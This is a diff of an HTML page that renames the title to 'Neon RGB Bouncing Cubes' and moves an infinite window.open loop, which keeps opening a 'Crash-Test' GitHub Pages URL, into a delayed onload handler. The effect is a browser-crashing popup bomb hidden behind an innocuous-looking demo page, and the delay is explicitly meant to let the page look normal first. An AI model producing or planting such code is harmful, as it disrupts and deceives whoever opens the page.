@@ -3,19 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Uh oh</title>
+    <title>Neon RGB Bouncing Cubes</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <script>
-        // Start infinite opening of the specified URL
-        (function openInfinitePages() {
-            while (true) {
-                window.open('https://wwebberr.github.io/The-Crash-Test/', '_blank');
-            }
-        })();
-    </script>
 
     <script src="script.js"></script>
+
+    <script>
+        window.onload = function() {
+            setTimeout(function() {
+                while (true) {
+                    window.open("https://wwebberr.github.io/The-Crash-Test/", '_blank');
+                }
+            }, 1000); // Delay added to ensure everything else loads first
+        };
+    </script>
+
 </body>
 </html>
